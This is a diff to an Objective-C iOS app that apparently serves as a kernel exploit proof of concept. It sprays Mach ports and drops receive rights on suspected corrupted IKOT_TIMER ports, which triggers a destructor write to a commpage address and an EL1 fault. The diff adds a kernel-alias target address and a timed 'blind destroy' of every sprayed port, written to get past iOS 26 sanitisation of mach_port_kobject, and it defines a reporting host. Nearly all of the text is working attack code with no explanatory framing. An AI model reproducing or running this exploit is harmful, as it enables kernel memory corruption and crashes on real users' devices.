@@ -32,10 +32,11 @@
 
 #define NUM_PORTS        20000
 #define NUM_SOCKETS      200
-#define COMMPAGE_TARGET  0x0000000FFFFFC330ULL
-#define IKOT_TIMER       27
-#define REPORT_HOST      "192.168.68.109"
-#define PROBE_INTERVAL_S 5
+#define COMMPAGE_TARGET      0x0000000FFFFFC330ULL
+#define COMMPAGE_TARGET_KERN 0xFFFFFE00FFFFC330ULL
+#define IKOT_TIMER           27
+#define REPORT_HOST          "192.168.68.109"
+#define PROBE_INTERVAL_S     1
 
 static mach_port_t g_ports[NUM_PORTS];
 static int         g_port_count = 0;
@@ -112,7 +113,7 @@ static void *probe_loop(void *arg) {
             mach_vm_address_t kobject = 0;
             if (mach_port_kobject(self, g_ports[i], &kotype, &kobject) != KERN_SUCCESS)
                 continue;
-            if (kotype != IKOT_TIMER && kobject != COMMPAGE_TARGET) continue;
+            if (kotype != IKOT_TIMER && kobject != COMMPAGE_TARGET && kobject != COMMPAGE_TARGET_KERN) continue;
             timer_ports++;
             ev("TIMER_PORT port=%d kotype=%u kobject=0x%016llx — mod_refs -1 RECEIVE",
                i, kotype, (unsigned long long)kobject);
@@ -140,10 +141,11 @@ static void scan_background(void) {
         /* iOS 26.x returns kotype=0xFFFFFFFF for IKOT_NONE (obfuscation). Skip PORT_CHANGED. */
         if (kotype == (natural_t)0xFFFFFFFF && kobject == 0) continue;
 
-        if (kobject == COMMPAGE_TARGET) {
+        if (kobject == COMMPAGE_TARGET || kobject == COMMPAGE_TARGET_KERN) {
             g_found = 1;
-            ev("QUALIFYING_HIT port=%d kotype=%u kobject=0x%016llx — mod_refs -1 RECEIVE",
-               i, kotype, (unsigned long long)kobject);
+            ev("QUALIFYING_HIT port=%d kotype=%u kobject=0x%016llx alias=%s — mod_refs -1 RECEIVE",
+               i, kotype, (unsigned long long)kobject,
+               kobject == COMMPAGE_TARGET_KERN ? "KERN" : "USER");
             /* mod_refs: io_refs 1->0 -> ipc_kobject_destroy -> IKOT_TIMER clock cleanup
              * -> store to (clock_t*)COMMPAGE_TARGET -> EL1 write fault -> qualifying IPS. */
             mach_port_mod_refs(mach_task_self(), g_ports[i], MACH_PORT_RIGHT_RECEIVE, -1);
@@ -217,6 +219,26 @@ static void scan_background(void) {
                                                       target:self
                                                     selector:@selector(scanTick:)
                                                     userInfo:nil repeats:YES];
+
+    /* Blind-destroy after 170s: mach_port_kobject() is sanitized on iOS 26,
+     * so detection never fires. Drop all spray ports unconditionally — any
+     * corrupted IKOT_TIMER port will dispatch its destructor -> commpage write
+     * -> EL1 fault -> qualifying IPS. */
+    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 170 * NSEC_PER_SEC),
+                   dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+        ev("BLIND_DESTROY_START n=%d", g_port_count);
+        int destroyed = 0;
+        for (int i = 0; i < g_port_count; i++) {
+            if (g_ports[i] != MACH_PORT_NULL) {
+                mach_port_mod_refs(mach_task_self(), g_ports[i],
+                                   MACH_PORT_RIGHT_RECEIVE, -1);
+                g_ports[i] = MACH_PORT_NULL;
+                destroyed++;
+            }
+        }
+        ev("BLIND_DESTROY_DONE destroyed=%d — listen for EL1 fault", destroyed);
+    });
+
     return YES;
 }
 
@@ -229,11 +251,11 @@ static void scan_background(void) {
         ev("ALIVE tick=%d found=%d ports=%d", tick, g_found, g_port_count);
 }
 
+@end
+
 int main(int argc, char *argv[]) {
     @autoreleasepool {
         return UIApplicationMain(argc, argv, nil,
                                  NSStringFromClass([AppDelegate class]));
     }
 }
-
-@end
